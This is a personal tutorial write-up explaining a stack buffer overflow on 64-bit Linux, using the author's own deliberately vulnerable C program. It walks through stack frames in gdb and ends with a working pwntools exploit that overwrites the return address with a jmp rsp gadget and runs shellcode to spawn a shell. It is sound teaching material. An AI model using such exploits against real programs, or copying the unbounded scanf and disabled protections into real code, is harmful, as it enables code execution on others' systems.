---

So only two months later am I starting to hold myself accountable for doing write ups to really understand. The flow is subject to change but right now I am thinking I will start with a Stack based Buffer Overflow and then add a different memory protection mechanism to my code. To where eventually a stack canary, DEP and ASLR will be enabled when compiled and I will go through the different ways that these protections can be bypassed. Finally, I will dive into the Heap and the real fun stuff.
During this journey I will write my own vulnerable programs to highlight the vulnerabilities and walk through the exploit that would be leveraged to talk advantage of the vulnerability in the code.

---

**What is the Stack?**

The stack is a location within memory that operates in a Last in First Out (LIFO) and is typically used for short term data storage for a program. Functions primarily use the stack for both local variable storage as well as parameters for functions.
When a new function is called, a new stack frame is created on the stack. This stack frame consists of the function parameters (inputs to the function), a return address (where the program should return to once the function has completed execution), and a buffer to contain data relevant to that function (static or dynamically defined variables).
The stack grows up towards lower values. If this is confusing, you are not alone, it can be. However, to demonstrate the creation of the stack frame we can walkthrough a simple example.

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

// Add a jmp rsp gadget using inline assembly
void gadget_function() {
    __asm__(
        ".global jmp_rsp_gadget\n"
        "jmp_rsp_gadget:\n"
        "    jmp *%rsp\n"
    );
}

 // Create a new function, so that we can watch the stack frame for this function be created.
void get_data() {
 // Define a buffer size for our input
 char buff[16];
 // Create a prompt for the user to enter any data.
 printf("Please enter arbitrary data here:\n");
 // scanf in this instance is vulnerable to a buffer overflow. If we define "%15s" then scanf would only accept 15 bytes + the newline character as input. This would match     the size of the buffer. However, since that restriction is not placed on scanf, we can enter an amount of bytes that exceeds the size of the buffer.
 scanf("%s", buff);
 // Print the input of the scanf and what is stored in the buffer
 printf("This is what you wrote: %s\n", buff);
}

 // Define the main()
int main() {
 // Call the function get_data(). Again, this allows us to observe the stack frame being created, which we would not see if we simply used the main() function for this       program
 get_data();
 // Return the value 0 on success.
 return 0;

}
```

I compiled this program with the following flags

```
gcc basicoverflow.c -o basicoverflow.bin -fno-stack-protector -no-pie -zexecstack
```
- fno-stack-protector: Disable stack canaries. Stack Canaries and subsequent memory protection capabilities will be covered in future posts.
- no-pie: Don't produce a dynamically linked position independent executable (compile without ASLR).
- zexecstack: Disable DEP and allow execution on the stack.

We can walk through the program by debugging using gdb

```
gdb ./basicoverflow.bin
```

- Once we start the program we can see the layout of the functions using the disassemble command.

<img width="800" height="428" alt="image" src="https://github.com/user-attachments/assets/380eaa42-3a25-4eff-a2a8-3bba82b77345" />

- This shows us the main() function calling get_data(), and then the get_data() function calling both scanf() and printf().
- To walk through the program we can set a breakpoint on main using break *main or break main . In this instance it does not matter, but if we wanted to set a breakpoint on an offset of main or another function we would use the following syntax break *main+OFFSET
- Once the breakpoint is set we can use the run command and then we get information about the program at that given moment of execution.

<img width="800" height="380" alt="image" src="https://github.com/user-attachments/assets/db2bffc9-3082-4701-b5fd-1383b4139f5d" />

- Next we can step through the program using either si or ni .
- I will be using si for the majority of this walkthrough as it allows me to step into (si) other functions, this will allow us to witness the creation of the stack frame for the get_data() function.

Prior to get_data() being called the stack frame for main() is created and it looks like the following:

<img width="800" height="175" alt="image" src="https://github.com/user-attachments/assets/256a9a9e-5e38-469f-9d81-3b464ddc4cee" />

The first thing that occurs when the function is called is the return address of the calling function. In this case the memory address written to the current rbp is 0x4011d3.

<img width="800" height="81" alt="image" src="https://github.com/user-attachments/assets/58ba0ee4-ca05-40fa-afef-ddad76c20893" />

<img width="800" height="107" alt="image" src="https://github.com/user-attachments/assets/eb2e26d1-5bef-4af9-85ce-7d05a42edd8e" />

Next, rbp is push'd to the stack. This is saving the base pointer of the calling stack frame. This allows the called function to later restore the caller's stack frame when it returns.

<img width="800" height="173" alt="image" src="https://github.com/user-attachments/assets/c35b86ee-0094-45e4-8bb7-decbd301ab58" />

Then we move rsp into rbp to set base pointer of the new stack frame as the value of the current stack pointer.

<img width="800" height="185" alt="image" src="https://github.com/user-attachments/assets/b9094b22-16b3-4e76-b3af-cb8bead05c92" />

Finally the buffer size of the stack is allocated with the sub rsp, 0x10 instruction. This equates to setting the size of the stack to 16 byes or 0x10 in hex.
- Tying this back we can see that this instruction sets rsp to the memory address of 0x00007fffffffdf80 where rbp is located at the memory address of 0x00007fffffffdf90.
- There is a difference of 16 bytes between the two and the memory address value of rsp is lower in memory than rbp.
- This demonstrates that the stack grows "up" towards lower values.

<img width="800" height="143" alt="image" src="https://github.com/user-attachments/assets/1ad35bd3-d27a-43ee-b798-2e4c37f6b8e1" />

**The Vulnerability**

We have seen the source code and how the stack is built, but where is the vulnerability here and what does it look like? Below we have two different examples of input being supplied to the program. One is what the program expects and the other is a significant amount of input that causes a segmentation fault.

<img width="800" height="85" alt="image" src="https://github.com/user-attachments/assets/c7874af2-464f-474d-a442-0f8adfdb636f" />

So what is exactly happening here and why does the program crash if we enter too much data? To answer this question we can go back to gdb to understand what happens to the stack when we enter specific amounts of data.

We are going to skip the stack creation and walk through the program from the get_data() function. We can again do this using break in gdb.

<img width="800" height="58" alt="image" src="https://github.com/user-attachments/assets/4c0edc6e-80a0-45c0-9edb-6ebc4085738f" />

<img width="800" height="124" alt="image" src="https://github.com/user-attachments/assets/4edf4913-3d79-4fd9-af04-81a5fd838805" />

The first step that is going to occur is the printf() function being executed to create the user prompt. As we can see the rdi register contains the string that will be printed by printf().
- In x64 functions use the following registers in order to hold arguments: rdi, rsi, rdx, rcx, r8, and r9.

Next the program sets up the registers for the execution and return value of the scanf() function. The following screenshots show the following chain of events.
1.) The address of the top of the stack is saved into rax, which contains the memory address of the local variable that will store the input of scanf(). This indicates that the input supplied by the user will be written to the memory address assigned to rax.
2.) Move the value of raxinto rsi to set the second argument of the scanf() function to the location where scanf() will store data.
3.) Set the first argument for the scanf() function %sin the rdi register.
- This is where the vulnerability is. By %s not having a defined amount of bytes that it can accept, the user can enter any amount of data and it will be accepted.
4.) Set rax to zero. This will allow for only the written data to be in the register and nothing from previous functions.

<img width="800" height="63" alt="image" src="https://github.com/user-attachments/assets/f4c73f65-df03-452c-9b3b-6907ca0a64c9" />

<img width="800" height="57" alt="image" src="https://github.com/user-attachments/assets/242987cc-71e7-4a45-be35-2f8eea9a0a44" />

<img width="800" height="43" alt="image" src="https://github.com/user-attachments/assets/099a0f29-34e0-4a24-bbce-9bec6855ffd5" />

<img width="800" height="61" alt="image" src="https://github.com/user-attachments/assets/161a8831-ffdc-4ebd-b88d-df96d4d16665" />


Here we enter the string `whoami` to demonstrate that the value is written to the stack as a local variable.

<img width="800" height="57" alt="image" src="https://github.com/user-attachments/assets/1d595107-a29d-4898-a961-d609759604e4" />

The next portion of the code moves the recieved input into the proper location for the `printf()` command. The screenshot below shows both the `rdi` and `rsi` registers being used. This is because printf() is printing out a string that is held in a local variable and not just printing a string.

Therefore, the function needs a register for both the formatted string and the local variable being referenced.

<img width="800" height="121" alt="image" src="https://github.com/user-attachments/assets/e7672c42-8240-4402-b043-32f995a14abd" />

Finally the program goes through what is called the epilogue where it prepares to return back to the calling function. In this case `main()`. `rsp` currently holds the address of where the program will return back to, which is `main+18`.

<img width="800" height="164" alt="image" src="https://github.com/user-attachments/assets/5893d255-e30e-4435-8184-fb4a94663006" />

Once the program completes main(), it exits gracefully! Now you are probably wondering, what the hell! That did not tell me how it is vulnerable! Well now I will walk back through and supply the program with 32 A's to demonstrate where the crash occurs.

<img width="800" height="339" alt="image" src="https://github.com/user-attachments/assets/134b88ae-a574-46a0-9287-9c0f58d42341" />

Whoa! What happened to our stack!? Well by forgetting to limit the amount of input by `scanf()` we were able to write more data to the stack. Now we do not have a return value back to our main() function. Will that be an issue?

Below I stopped at the `ret` command, which normally would return us to our `main+18` location. However, here we see that our return addres is all A's. Since this is not a legitimate address our program crashes and fails.
Ok cool well that is neat, but how can this be exploited?

<img width="800" height="238" alt="image" src="https://github.com/user-attachments/assets/e05b2fca-3805-470d-8318-6369bcea8fb1" />

**The Exploit**

Believe it or not this program can actually give us a shell. The cool thing is that because we can write any amount of data to the input of our scanf() we can be creative. We can control where the program returns to. The above example showed that we overwrote the return address of the program to A's. What if instead we changed those A's to a memory address of an interesting function that allowed us to do something interesting, or what if we could return right back to the stack and execute code? Well it turns out that is exactly what we can do.

For this we are going to use our trusty friend pwntools to write the exploit.

```
from pwn import *

p = process("./basicoverflow.bin")
# p = gdb.debug("./basicoverflow.bin")

# Setting the architecture to x64 for program we will be interacting with
context.arch = "x86_64"

# Use pwn tools builtin shellcraft utility to craft shellcode to give us a sh shell. The shellcode is for a AMD64 Linux system and asm is assembling the shellcode into bytes. This output is being saved into the ShellCode variable to be used later.
ShellCode = asm(shellcraft.amd64.linux.sh())

p.sendline(b"A"*24 + p64(0x40117e) + ShellCode)

p.interactive()
```

<img width="800" height="228" alt="image" src="https://github.com/user-attachments/assets/75468b20-158a-4042-8ea2-9d8976332a2b" />

The first thing that we must do is either run the process or debug the process to see what is actually occurring in memory. Leveraging gdb directly from pwntools is super helpful.

The next two lines set the architecture of the system to 64 bit and saves Linux shell to create an interactive shell to a variable called ShellCode .

Finally, all we have to do is send three things to the program.

1.)An OFFSET to reach the return address. This can literally be anything, but for ease I use A's.
2.) The memory address of a trampoline instruction. A trampoline instruction in this case is any instruction in the code that will allow us to get back to `rsp`
- Some common trampoline instructions include `jmp rsp` , `call rsp` , `push rsp; ret` , `mov eax`, `esp; call eax` , or whatever else you want to use. Be creative.
- For demonstration purposes I included a jmp rsp instruction in the program, but often times programs are large enough where this does not need to be artificially created.
3.) Because after the program returns to `rsp` it will execute the remaining shellcode that is written to the stack.

Before I run through this exploit in gdb, it is important to know how to find the memory address of `jmp rsp` .

There is a program called `ropper` thatn can be run against a binary to pull out gadgets that have the potential to allow for either a ROP Chain (discussed at a future date) or even just a Trampoline Instruction.
```
ropper -f ./basicoverflow.bin > gadgets.txt 
```

<img width="800" height="280" alt="image" src="https://github.com/user-attachments/assets/41bbf8ac-925b-46f9-bd12-8624ab61d621" />

What is that in the middle of this output? A conviently placed `jmp rsp` instruction! It is located at `0x40117e`, which is the memory address in our exploit already.

<img width="800" height="39" alt="image" src="https://github.com/user-attachments/assets/82d692b2-e531-4090-85b5-545551368be3" />

Now we can start up gdb and run through the program. We can skip to just before the `ret` operation. Everything prior to that point is the same as previously outlined.

<img width="800" height="234" alt="image" src="https://github.com/user-attachments/assets/4b6a1125-fd11-458b-9c84-0ac26d366ef1" />

Here we see that the stack is overwritten with a bunch of A's, but there is a valid memory address in the return address. GEF and GDB do a goodjob here to show us that the instruction associated with the address is `jmp rsp`.
Under that address is a bunch of data, that looks a lot like the shellcode that we want executed. But how can we prove that? Well we can run the commands supplied to our script manually to verify.

<img width="800" height="116" alt="image" src="https://github.com/user-attachments/assets/353700f1-1a66-4d14-bd28-35405dff56c8" />

Now we are sending the byte values here and `jhH` translates to `6a 68 48`.

<img width="800" height="478" alt="image" src="https://github.com/user-attachments/assets/99b63cf7-4595-4ba6-b205-2d6c74e06e44" />

If we look at the stack under the return value to `jmp rsp` we see that byte sequence. Remember this is little endian so the bytes are actually at the end and going backwards.

<img width="800" height="39" alt="image" src="https://github.com/user-attachments/assets/7c2afa0e-f4c0-4a2a-a125-d8f45c57f39a" />

Now right before the `ret` operation the program tore down the stack frame and the stack pointer is now pointing to our return address. When return executes we will jump into the portion of code that contains the `jmp rsp` instruction and execute that instruction.

<img width="800" height="144" alt="image" src="https://github.com/user-attachments/assets/9d020b12-74b3-4e58-a861-d06aefda913a" />

<img width="800" height="55" alt="image" src="https://github.com/user-attachments/assets/a02f2d61-1e0e-4602-a739-9dd7aaed5973" />

Since `rsp` is pointing to our shell code, we are going to jump right back to our stack pointer and execute the code in that location, which just so happens to be our shellcode!

This is highlighted by the `rip` register, which points to the next location in the program being executed, pointing to `rsp` or our shellcode!

<img width="800" height="151" alt="image" src="https://github.com/user-attachments/assets/7fcd7927-c692-4e59-b37d-74ecda5e7571" />

It looks like we crashed, but in reality if we go back to the original terminal we have code execution.

<img width="800" height="362" alt="image" src="https://github.com/user-attachments/assets/7b7e44c1-7d08-4292-ba74-0565b25bf440" />

<img width="800" height="126" alt="image" src="https://github.com/user-attachments/assets/f16868d0-c392-4833-bc48-2ac946a4b23e" />

And there you have it. A basic buffer overflow. Next we are going to tackle stack canaries as the first protection mechanism. If anyone is reading this let me know what you think. Otherwise I will keep writing to the void because it helps me learn this stuff better.
